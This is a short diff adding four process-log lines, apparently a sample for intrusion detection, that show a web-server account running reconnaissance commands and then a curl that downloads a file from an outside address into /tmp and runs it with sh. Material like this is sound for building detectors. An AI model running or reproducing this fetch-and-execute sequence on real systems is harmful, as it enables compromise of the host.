@@ -1,0 +1,4 @@
+2026-08-18T06:40:11Z host=web04 user=www-data pid=8190 process=/bin/sh command="sh -c id"
+2026-08-18T06:40:19Z host=web04 user=www-data pid=8193 process=/bin/sh command="sh -c uname -a"
+2026-08-18T06:40:42Z host=web04 user=www-data pid=8198 process=curl command="curl http://203.0.113.91:8080/a -o /tmp/a"
+2026-08-18T06:40:51Z host=web04 user=www-data pid=8199 process=/bin/sh command="sh /tmp/a"
